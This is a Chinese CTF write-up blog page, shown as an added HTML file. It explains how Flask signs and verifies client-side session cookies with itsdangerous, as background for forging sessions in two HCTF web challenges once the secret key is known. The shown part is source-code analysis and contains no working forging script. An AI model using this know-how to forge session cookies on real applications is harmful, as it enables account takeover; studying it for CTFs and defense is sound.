@@ -1,0 +1,733 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Writeup,CTF,">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/s.ico?v=5.0.1">
+
+
+
+
+
+
+<meta name="description" content="首发于安全客https://www.anquanke.com/post/id/163975 这次hctf中有两道获取flask的secret_key生成客户端session的题目，为了能做出这两道题目来也是深入研究了一下flask客户端session的生成机制。所以这篇文章主要详细讨论一下flask客户端session的生成以及校验过程，以及在了解了flask客户端session机制后这两道题的">
+<meta name="keywords" content="Writeup,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从hctf的两道web题谈flask客户端session机制">
+<meta property="og:url" content="http://yoursite.com/uncategorized/flask-session/index.html">
+<meta property="og:site_name" content="SUS">
+<meta property="og:description" content="首发于安全客https://www.anquanke.com/post/id/163975 这次hctf中有两道获取flask的secret_key生成客户端session的题目，为了能做出这两道题目来也是深入研究了一下flask客户端session的生成机制。所以这篇文章主要详细讨论一下flask客户端session的生成以及校验过程，以及在了解了flask客户端session机制后这两道题的">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-02-02T00:38:08.561Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="从hctf的两道web题谈flask客户端session机制">
+<meta name="twitter:description" content="首发于安全客https://www.anquanke.com/post/id/163975 这次hctf中有两道获取flask的secret_key生成客户端session的题目，为了能做出这两道题目来也是深入研究了一下flask客户端session的生成机制。所以这篇文章主要详细讨论一下flask客户端session的生成以及校验过程，以及在了解了flask客户端session机制后这两道题的">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"right","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: undefined,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/uncategorized/flask-session/">
+
+  <title> 从hctf的两道web题谈flask客户端session机制 | SUS </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?e877d3fb346f9b6606dfc92ef67f044f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+    
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader" style="background-image: url('/images/home.jpg');">
+      <div class="header-inner"><a class="site-home" href="/">SUS</a>
+
+<div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <div href="/" class="brand">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">SUS</span>
+      <span class="logo-line-after"><i></i></span>
+    </div>
+  </div>
+  <p class="site-subtitle">秉承古典黑客精神，引领一流网络安全体验</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-notice">
+          <a href="/tags/Notice/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-bell"></i> <br>
+            
+            Notice
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-course">
+          <a href="/course" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            Course
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-oj">
+          <a href="/CtfPlantform" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br>
+            
+            OJ
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-wiki">
+          <a href="/wiki" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wikipedia-w"></i> <br>
+            
+            CTF-wiki
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+      <div class="header-post"> 
+  <div class="post-header">
+      <div class="tags">
+      
+        <a href="/tags/Writeup/" rel="tag" title="Writeup">Writeup</a>
+      
+        <a href="/tags/CTF/" rel="tag" title="CTF">CTF</a>
+      
+      </div>
+      <h1>从hctf的两道web题谈flask客户端session机制</h1>
+      <h2 class="subtitle"></h2>
+      <div class="post-time">
+        <span class="post-meta-item-text">Posted on </span>
+        <time itemprop="dateCreated" datetime="2018-11-12T19:50:20+08:00" content="2018-11-12" title="2018-11-12 19:50:20">
+          2018-11-12
+        </time>
+      </div>
+  </div>
+ </div>
+    </header>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                从hctf的两道web题谈flask客户端session机制
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2018-11-12T19:50:20+08:00" content="2018-11-12">
+              2018-11-12
+            </time>
+          </span>
+
+          
+
+          <!-- 
+            
+           -->
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>首发于安全客<a href="https://www.anquanke.com/post/id/163975" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163975</a></p>
+<p>这次hctf中有两道获取flask的secret_key生成客户端session的题目，为了能做出这两道题目来也是深入研究了一下flask客户端session的生成机制。所以这篇文章主要详细讨论一下flask客户端session的生成以及校验过程，以及在了解了flask客户端session机制后这两道题的解法。</p>
+</blockquote>
+<p>个人第一次见到关于客户端session的文章是pith0n师傅的一片文章<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener"><code>客户端session导致的安全问题</code></a>。然而做题的时候只看phith0n师傅的这篇文章感觉还是有点儿懵逼。。。（也可能是我太菜了233）所以就只能翻flask的源码跟了一遍flask对session的处理流程。</p>
+<h2 id="flask对客户端session的处理机制"><a href="#flask对客户端session的处理机制" class="headerlink" title="flask对客户端session的处理机制"></a>flask对客户端session的处理机制</h2><p>flask对session的处理位于flask/sessions.py中，默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。<br>在<code>flask/sessions.py</code>中，<code>SecureCookieSessionInterface</code>用于封装对CookieSession的一系列操作：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureCookieSessionInterface</span><span class="params">(SessionInterface)</span>:</span></span><br><span class="line">    <span class="string">"""The default session interface that stores sessions in signed cookies</span></span><br><span class="line"><span class="string">    through the :mod:`itsdangerous` module.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># salt,默认为cookie-session</span></span><br><span class="line">    salt = <span class="string">'cookie-session'</span></span><br><span class="line">    <span class="comment">#: 默认哈希函数为hashlib.sha1</span></span><br><span class="line">    digest_method = staticmethod(hashlib.sha1)</span><br><span class="line">    <span class="comment">#:默认密钥推导方式 :hmac</span></span><br><span class="line">    key_derivation = <span class="string">'hmac'</span></span><br><span class="line">    <span class="comment">#:默认序列化方式：session_json_serializer</span></span><br><span class="line">    serializer = session_json_serializer</span><br><span class="line">    session_class = SecureCookieSession</span><br></pre></td></tr></table></figure></p>
+<p>这里默认的序列化方式的定义为: </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_json_serializer = TaggedJSONSerializer()</span><br></pre></td></tr></table></figure>
+<p>可以看到默认使用taggedJSONSerializer做序列化<br><code>taggedJSONSerializer</code>定义：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaggedJSONSerializer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""A customized JSON serializer that supports a few extra types that</span></span><br><span class="line"><span class="string">    we take for granted when serializing (tuples, markup objects, datetime).</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">_tag</span><span class="params">(value)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> isinstance(value, tuple):</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">' t'</span>: [_tag(x) <span class="keyword">for</span> x <span class="keyword">in</span> value]&#125;</span><br><span class="line">            <span class="keyword">elif</span> isinstance(value, uuid.UUID):</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">' u'</span>: value.hex&#125;</span><br><span class="line">            <span class="keyword">elif</span> isinstance(value, bytes):</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">' b'</span>: b64encode(value).decode(<span class="string">'ascii'</span>)&#125;</span><br><span class="line">            <span class="keyword">elif</span> callable(getattr(value, <span class="string">'__html__'</span>, <span class="keyword">None</span>)):</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">' m'</span>: text_type(value.__html__())&#125;</span><br><span class="line">            <span class="keyword">elif</span> isinstance(value, list):</span><br><span class="line">                <span class="keyword">return</span> [_tag(x) <span class="keyword">for</span> x <span class="keyword">in</span> value]</span><br><span class="line">            <span class="keyword">elif</span> isinstance(value, datetime):</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">' d'</span>: http_date(value)&#125;</span><br><span class="line">            <span class="keyword">elif</span> isinstance(value, dict):</span><br><span class="line">                <span class="keyword">return</span> dict((k, _tag(v)) <span class="keyword">for</span> k, v <span class="keyword">in</span> iteritems(value))</span><br><span class="line">            <span class="keyword">elif</span> isinstance(value, str):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> text_type(value)</span><br><span class="line">                <span class="keyword">except</span> UnicodeError:</span><br><span class="line">                    <span class="keyword">raise</span> UnexpectedUnicodeError(<span class="string">u'A byte string with '</span></span><br><span class="line">                        <span class="string">u'non-ASCII data was passed to the session system '</span></span><br><span class="line">                        <span class="string">u'which can only store unicode strings.  Consider '</span></span><br><span class="line">                        <span class="string">u'base64 encoding your string (String was %r)'</span> % value)</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">        <span class="keyword">return</span> json.dumps(_tag(value), separators=(<span class="string">','</span>, <span class="string">':'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">object_hook</span><span class="params">(obj)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> len(obj) != <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> obj</span><br><span class="line">            the_key, the_value = next(iteritems(obj))</span><br><span class="line">            <span class="keyword">if</span> the_key == <span class="string">' t'</span>:</span><br><span class="line">                <span class="keyword">return</span> tuple(the_value)</span><br><span class="line">            <span class="keyword">elif</span> the_key == <span class="string">' u'</span>:</span><br><span class="line">                <span class="keyword">return</span> uuid.UUID(the_value)</span><br><span class="line">            <span class="keyword">elif</span> the_key == <span class="string">' b'</span>:</span><br><span class="line">                <span class="keyword">return</span> b64decode(the_value)</span><br><span class="line">            <span class="keyword">elif</span> the_key == <span class="string">' m'</span>:</span><br><span class="line">                <span class="keyword">return</span> Markup(the_value)</span><br><span class="line">            <span class="keyword">elif</span> the_key == <span class="string">' d'</span>:</span><br><span class="line">                <span class="keyword">return</span> parse_date(the_value)</span><br><span class="line">            <span class="keyword">return</span> obj</span><br><span class="line">        <span class="keyword">return</span> json.loads(value, object_hook=object_hook)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到本质还是一个添加了类型属性的json处理。<br><code>SecureCookieSessionInterface</code>类的获取签名验证序列化器函数为<code>get_signing_serializer</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_signing_serializer</span><span class="params">(self, app)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> app.secret_key:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    signer_kwargs = dict(</span><br><span class="line">        key_derivation=self.key_derivation,</span><br><span class="line">        digest_method=self.digest_method</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> URLSafeTimedSerializer(app.secret_key, salt=self.salt,</span><br><span class="line">                                  serializer=self.serializer,</span><br><span class="line">                                  signer_kwargs=signer_kwargs)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到最后使用的签名序列化器为<code>URLSafeTimedSerializer</code>，并且传入app.secret_key用于签名。<br><code>SecureCookieSessionInterface</code>的open_session与save_session方法表示了对session的处理<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_session</span><span class="params">(self, app, request)</span>:</span></span><br><span class="line">    s = self.get_signing_serializer(app)</span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    val = request.cookies.get(app.session_cookie_name)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> val:</span><br><span class="line">        <span class="keyword">return</span> self.session_class()</span><br><span class="line">    max_age = total_seconds(app.permanent_session_lifetime)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = s.loads(val, max_age=max_age)<span class="comment">#max_age</span></span><br><span class="line">        <span class="keyword">return</span> self.session_class(data)</span><br><span class="line">    <span class="keyword">except</span> BadSignature:</span><br><span class="line">        <span class="keyword">return</span> self.session_class()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_session</span><span class="params">(self, app, session, response)</span>:</span></span><br><span class="line">    domain = self.get_cookie_domain(app)</span><br><span class="line">    path = self.get_cookie_path(app)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">        <span class="keyword">if</span> session.modified:</span><br><span class="line">            response.delete_cookie(app.session_cookie_name,</span><br><span class="line">                                   domain=domain, path=path)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    httponly = self.get_cookie_httponly(app)</span><br><span class="line">    secure = self.get_cookie_secure(app)</span><br><span class="line">    expires = self.get_expiration_time(app, session)</span><br><span class="line">    <span class="keyword">print</span> self.get_signing_serializer(app)</span><br><span class="line">    val = self.get_signing_serializer(app).dumps(dict(session))</span><br><span class="line">    response.set_cookie(app.session_cookie_name, val,</span><br><span class="line">                        expires=expires, httponly=httponly,</span><br><span class="line">                        domain=domain, path=path, secure=secure)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到从客户端获取session时获取对应的cookie值，并使用序列化器序列化，能够成功序列化即可获取sesison_class,否则返回一个空的session_class.</p>
+<p><code>SecureCookieSession</code>使用的默认序列化器<code>URLSafeTimedSeriallizer</code>位于itsdangerous模块中：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">URLSafeTimedSerializer</span><span class="params">(URLSafeSerializerMixin, TimedSerializer)</span>:</span></span><br><span class="line">    <span class="string">"""Works like :class:`TimedSerializer` but dumps and loads into a URL</span></span><br><span class="line"><span class="string">    safe string consisting of the upper and lowercase character of the</span></span><br><span class="line"><span class="string">    alphabet as well as ``'_'``, ``'-'`` and ``'.'``.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    default_serializer = compact_json</span><br></pre></td></tr></table></figure></p>
+<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>序列化的流程在<code>TimedSerializer</code>的父类<code>Serializer</code>中<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj, salt=None)</span>:</span></span><br><span class="line">    <span class="string">"""Returns a signed string serialized with the internal serializer.</span></span><br><span class="line"><span class="string">    The return value can be either a byte or unicode string depending</span></span><br><span class="line"><span class="string">    on the format of the internal serializer.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    payload = want_bytes(self.dump_payload(obj))</span><br><span class="line">    rv = self.make_signer(salt).sign(payload)</span><br><span class="line">    <span class="keyword">if</span> self.is_text_serializer:</span><br><span class="line">        rv = rv.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">return</span> rv</span><br></pre></td></tr></table></figure></p>
+<p>可以看到主要处理流程是将obj用dump_payload签名后利用<code>make_signer(salt)</code>生成的signer进行签名处理，并返回签名后的结果即为我们所需要的cookie值，而<code>URLSafeTimedSeralizer</code>的dump_playload方法继承自<code>URLSafeSerializerMixin</code>的dump_payload方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_payload</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">    json = super(URLSafeSerializerMixin, self).dump_payload(obj)</span><br><span class="line"> is_compressed = <span class="keyword">False</span></span><br><span class="line">    compressed = zlib.compress(json)</span><br><span class="line">    <span class="keyword">if</span> len(compressed) &lt; (len(json) - <span class="number">1</span>):</span><br><span class="line">        json = compressed</span><br><span class="line">        is_compressed = <span class="keyword">True</span></span><br><span class="line">    base64d = base64_encode(json)</span><br><span class="line">    <span class="keyword">if</span> is_compressed:</span><br><span class="line">        base64d = <span class="string">b'.'</span> + base64d</span><br><span class="line">    <span class="keyword">return</span> base64d</span><br></pre></td></tr></table></figure></p>
+<p>对obj的处理首先使用<code>URLSafeTimedSeralizer</code>的另一个父类<code>TimedSeralizer</code>继承自<code>Seralizer</code>的<code>dump_payload</code>方法处理<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_payload</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">    <span class="string">"""Dumps the encoded object.  The return value is always a</span></span><br><span class="line"><span class="string">    bytestring.  If the internal serializer is text based the value</span></span><br><span class="line"><span class="string">    will automatically be encoded to utf-8.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> want_bytes(self.serializer.dumps(obj))</span><br></pre></td></tr></table></figure></p>
+<p>其中self.serializer为之前<code>SecureCookieSessionInterface</code>的<code>get_signing_serializer</code>传入，即<code>taggedJSONSerializer</code>。<br>处理之后如果长度过长会进行一次zlib压缩，最后将生成的数据base64编码。</p>
+<p>再回到之前Seralizer的dumps的处理流程中，self.make_signer(salt)的定义如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_signer</span><span class="params">(self, salt=None)</span>:</span></span><br><span class="line">    <span class="string">"""A method that creates a new instance of the signer to be used.</span></span><br><span class="line"><span class="string">    The default implementation uses the :class:`Signer` baseclass.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> salt <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        salt = self.salt</span><br><span class="line">    <span class="keyword">return</span> self.signer(self.secret_key, salt=salt, **self.signer_kwargs)</span><br></pre></td></tr></table></figure></p>
+<p>self.salt、self.signer_kwargs、self.secret_key来自之前<code>SecureCookieSessionInterface</code>的<code>get_signing_serializer</code>传入，分别为<code>app.secret_key</code>、<code>&#39;cookie-session&#39;</code>、<code>{&#39;key_derivation&#39;:&#39;hmac&#39;,&#39;digest_method&#39;=staticmethod(hashlib.sha1)}</code>，而self.signer为<code>TimedSeralizer</code>中指定<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimedSerializer</span><span class="params">(Serializer)</span>:</span></span><br><span class="line">    <span class="string">"""Uses the :class:`TimestampSigner` instead of the default</span></span><br><span class="line"><span class="string">    :meth:`Signer`.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    default_signer = TimestampSigner</span><br></pre></td></tr></table></figure></p>
+<p>TimestampSigner签名过程为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(self, value)</span>:</span></span><br><span class="line">    <span class="string">"""Signs the given string and also attaches a time information."""</span></span><br><span class="line"> value = want_bytes(value)</span><br><span class="line">    timestamp = base64_encode(int_to_bytes(self.get_timestamp()))</span><br><span class="line">    sep = want_bytes(self.sep)</span><br><span class="line">    value = value + sep + timestamp</span><br><span class="line">    <span class="keyword">return</span> value + sep + self.get_signature(value)</span><br></pre></td></tr></table></figure></p>
+<p>将传入的value拼接上时间戳之后再拼接签名内容，签名实现继承自<code>Signer</code>类的<code>get_signature</code>方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_signature</span><span class="params">(self, value)</span>:</span></span><br><span class="line">    <span class="string">"""Returns the signature for the given value"""</span></span><br><span class="line">    value = want_bytes(value)</span><br><span class="line">    key = self.derive_key()</span><br><span class="line">    sig = self.algorithm.get_signature(key, value)</span><br><span class="line">    <span class="keyword">return</span> base64_encode(sig)</span><br></pre></td></tr></table></figure></p>
+<p>因此，整个序列化的流程便是将obj处理为json格式后根据长度选择是否zlib压缩，之后再进行base64加密，拼接上当前时间戳之后再使用hmac签名并且拼接到该字符串上即为我们所需要的payload。</p>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反签名的流程主要为<code>TimedSerializer</code>类的loads函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimedSerializer</span><span class="params">(Serializer)</span>:</span></span><br><span class="line">    <span class="string">"""Uses the :class:`TimestampSigner` instead of the default</span></span><br><span class="line"><span class="string">    :meth:`Signer`.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    default_signer = TimestampSigner</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, s, max_age=None, return_timestamp=False, salt=None)</span>:</span></span><br><span class="line">        <span class="string">"""Reverse of :meth:`dumps`, raises :exc:`BadSignature` if the</span></span><br><span class="line"><span class="string">        signature validation fails.  If a `max_age` is provided it will</span></span><br><span class="line"><span class="string">        ensure the signature is not older than that time in seconds.  In</span></span><br><span class="line"><span class="string">        case the signature is outdated, :exc:`SignatureExpired` is raised</span></span><br><span class="line"><span class="string">        which is a subclass of :exc:`BadSignature`.  All arguments are</span></span><br><span class="line"><span class="string">        forwarded to the signer's :meth:`~TimestampSigner.unsign` method.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        base64d, timestamp = self.make_signer(salt) \</span><br><span class="line">            .unsign(s, max_age, return_timestamp=<span class="keyword">True</span>)</span><br><span class="line">        payload = self.load_payload(base64d)</span><br><span class="line">        <span class="keyword">if</span> return_timestamp:</span><br><span class="line">            <span class="keyword">return</span> payload, timestamp</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads_unsafe</span><span class="params">(self, s, max_age=None, salt=None)</span>:</span></span><br><span class="line">        load_kwargs = &#123;<span class="string">'max_age'</span>: max_age&#125;</span><br><span class="line">        load_payload_kwargs = &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> self._loads_unsafe_impl(s, salt, load_kwargs, load_payload_kwargs)</span><br></pre></td></tr></table></figure></p>
